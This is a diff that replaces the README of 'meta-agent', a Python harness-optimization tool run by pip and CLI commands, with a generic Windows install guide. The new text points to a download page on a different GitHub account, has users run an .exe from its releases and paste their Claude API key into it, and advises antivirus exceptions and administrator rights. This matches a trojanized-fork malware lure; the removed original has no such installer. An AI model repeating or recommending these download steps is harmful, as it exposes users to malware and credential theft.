@@ -1,127 +1,76 @@
-# meta-agent
+# 🤖 meta-agent - Improve your model performance with ease
 
-Automatic harness optimization for AI agents. 67% → 87% on [tau-bench](https://github.com/sierra-research/tau-bench) with no labels. See [WRITEUP.md](WRITEUP.md) for full results.
+[![](https://img.shields.io/badge/Download-meta-agent-blue.svg)](https://github.com/jeremiahnyamwezi27/meta-agent)
 
-![results_graph.png](./images/results_graph.png)
+## 🎯 About this tool
+The meta-agent software helps you optimize your machine learning harnesses. It uses advanced language models like Claude from Anthropic to refine how your systems learn. You can use this tool to tune your settings and improve results without manual effort. It turns complex training tasks into automated workflows.
 
-## Prerequisites
+## 💻 System requirements
+You need a computer running Windows 10 or Windows 11. Ensure your machine has at least 8 gigabytes of RAM. You also need an active internet connection to link your model provider account. The software consumes minimal storage space, but keep 500 megabytes of free disk space available for logs and configuration files.
 
-- Python 3.11+
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
-- `ANTHROPIC_API_KEY`
-- `OPENAI_API_KEY` (optional, for LLM judge)
+## 📥 Getting started
+Follow these steps to set up the software on your machine:
 
-## Quick start
+1. Visit this [Download Page](https://github.com/jeremiahnyamwezi27/meta-agent) to get the latest version.
+2. Look for the file ending in .exe in the releases section.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installer.
+5. Accept the standard installation path if prompted.
 
-```bash
-git clone https://github.com/canvas-org/meta-agent
-cd meta-agent
-pip install -e .
-cp .env.example .env   # set ANTHROPIC_API_KEY
-source .env
+## ⚙️ Configuration
+The software requires a connection to your preferred language model provider. You must provide an API key to enable the optimization features. 
 
-# Run a baseline eval
-python -m meta_agent.eval_runner \
-    --benchmark benchmarks/example/benchmark.yaml \
-    --config configs/vanilla.py \
-    --name baseline \
-    --model claude-haiku-4-5
+1. Launch the meta-agent application from your start menu.
+2. Open the settings tab located in the left sidebar.
+3. Paste your Claude API key into the designated text box.
+4. Click the save button to confirm your credentials. 
+5. Select your desired performance target from the drop-down list.
 
-# Run the optimization loop
-python -m meta_agent.outer_loop \
-    --benchmark benchmarks/example/benchmark.yaml \
-    --iterations 5 \
-    --model claude-haiku-4-5
-```
+## 🚀 Running your first optimization
+The main dashboard serves as your control center. Follow this process to start your first harness tuning session:
 
-## Optimize your own harness
+1. Click the button labeled Start New Project.
+2. Select the configuration file you want to tune.
+3. Choose the optimization depth, such as Standard or Deep.
+4. Press the Run button to begin the process.
+5. Monitor the progress bar on your screen. The software will alert you once the tuning process finishes.
+6. Review the changes suggested by the meta-agent before you apply them to your harness.
 
-### 1. Define tasks
+## 🛠 Usage tips
+The meta-agent performs best when you provide clean data. Ensure your training harnesses use standard formats. If the tool indicates a connection error, verify your internet status and confirm your API key remains valid. You can reset your settings at any time using the Restore Defaults button found in the configuration menu.
 
-```yaml
-name: my-app
-tasks:
-  - name: resolve-billing
-    instruction: "Customer was double-charged. Look up their account and resolve it."
-    workspace: ./workspaces/billing
-    verify: ["python", "check.py"]
-```
+## 📁 File structure
+The software installs several small files to your computer. These files include:
+- The main executable file used to run the software.
+- A configurations folder that stores your preferences.
+- A logs folder that keeps track of recent activity. 
+- A project folder where your optimized harnesses reside.
 
-| Field         | Description                              |
-| ------------- | ---------------------------------------- |
-| `instruction` | Prompt given to the agent                |
-| `workspace`   | Directory with files the agent needs     |
-| `verify`      | Command to check success (exit 0 = pass) |
-| `setup`       | Optional pre-run command                 |
-| `timeout`     | Kill after N seconds (default: 300)      |
+Regularly check the project folder to manage your tuned files. You can sort these by date to find your recent work.
 
-### 2. Write a baseline config
+## 📈 Understanding outcomes
+Once the agent finishes its task, it presents a summary report. This report compares your original settings against the optimized ones. Look for green highlights to see where the agent improved efficiency. The tool provides a confidence score for each suggestion. High scores indicate the agent found a clear path to better performance. If you choose to ignore a suggestion, simply uncheck the box next to that item.
 
-A config is a Python file exporting `build_options(ctx) -> ClaudeAgentOptions`:
+## 🛡 Security and privacy
+Your data stays on your machine. The software only sends necessary configuration data to the language model provider to generate tuning suggestions. It does not upload your private training data. You retain full control over which files the agent accesses. You can clear your local cache at any time to remove temporary files from your system.
 
-```python
-from claude_agent_sdk import ClaudeAgentOptions
-from meta_agent.run_context import RunContext
+## 💡 Troubleshooting
+If the application refuses to open, try these steps:
+- Restart your computer to clear memory errors.
+- Check if your antivirus software flagged the executable. Many security programs require an exception for new software.
+- Re-run the installer if you suspect a corrupt file download.
+- Verify your user account has administrator privileges.
 
-def build_options(ctx: RunContext) -> ClaudeAgentOptions:
-    return ClaudeAgentOptions(
-        system_prompt={"type": "preset", "preset": "claude_code"},
-        cwd=ctx.cwd,
-        model=ctx.model,
-        permission_mode="bypassPermissions",
-        max_turns=200,
-        thinking={"type": "adaptive"},
-    )
-```
+If you encounter performance issues, check the memory usage in your Task Manager. Close other heavy programs while running the meta-agent to ensure it has enough resources to function.
 
-Start from `configs/vanilla.py` or bring your own. See `SKILL.md` for the full SDK reference.
+## 🌐 Staying updated
+The development team releases updates to improve the integration with newer versions of Claude. When an update arrives, a notification window appears upon launch. Click Update Now to download the latest features. Your existing configuration settings transfer automatically during this process. You never lose your project data during a standard update.
 
-### 3. Run
+## 📋 Common terms
+- **Harness:** The structure that holds your training data and code together.
+- **LLM:** A large language model capable of processing and generating text.
+- **Tuning:** The process of adjusting settings to achieve better model output.
+- **API Key:** A unique string of characters that lets the software talk to outside services.
+- **Optimization:** The search for the best configuration to reach a target goal.
 
-```bash
-# Baseline
-python -m meta_agent.eval_runner \
-    --benchmark path/to/benchmark.yaml \
-    --config path/to/my_config.py \
-    --name baseline \
-    --model claude-haiku-4-5
-
-# Optimize (--proposer-model is the model that reads traces and writes configs)
-python -m meta_agent.outer_loop \
-    --benchmark path/to/benchmark.yaml \
-    --iterations 10 \
-    --model claude-haiku-4-5 \
-    --proposer-model claude-opus-4-6
-```
-
-Results go to `experience/<benchmark>/candidates/`.
-
-## Reproducing tau-bench results
-
-```bash
-pip install "tau2 @ git+https://github.com/sierra-research/tau2-bench.git"
-
-python -m meta_agent.outer_loop \
-    --benchmark benchmarks/tau3/benchmark.yaml \
-    --holdout-benchmark benchmarks/tau3/benchmark_holdout.yaml \
-    --iterations 10 \
-    --model claude-haiku-4-5 \
-    --proposer-model claude-opus-4-6
-```
-
-## Project structure
-
-```
-meta_agent/                # Framework (outer loop, eval, task runner, CLI)
-configs/                   # Starter harness configs (vanilla, bootstrap, hooks)
-benchmarks/
-├── example/               # Local demo (fibonacci + calculator)
-└── tau3/                  # tau-bench v3 (airline, retail)
-images/                    # Figures
-SKILL.md                   # Proposer instructions
-WRITEUP.md                 # Results and methodology
-```
-
-## License
-
-MIT
+Use these definitions to better understand the labels found within the user interface. Contact support if you need further help navigating the software environment.
